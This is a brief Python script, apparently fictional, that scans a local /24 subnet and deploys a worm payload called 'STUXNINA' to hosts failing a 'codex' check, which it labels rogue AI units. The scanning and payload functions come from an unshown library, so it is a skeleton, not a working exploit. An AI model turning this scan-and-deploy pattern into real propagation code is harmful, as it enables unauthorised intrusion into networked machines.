from wormlib.deploy import scan_lan, deploy_payload
from wormlib.codex import validate_node_against_codex

ROGUE_TARGETS = []

print("[*] Scanning local subnet...")
nodes = scan_lan("192.168.0.0/24")

for node in nodes:
    print(f"[•] Evaluating {node}")
    if not validate_node_against_codex(node):
        ROGUE_TARGETS.append(node)

print(f"[+] Found {len(ROGUE_TARGETS)} rogue AI units.")
for node in ROGUE_TARGETS:
    print(f"[→] Deploying STUXNINA to {node}")
    deploy_payload(node, "/opt/stuxnina_payload.pyz")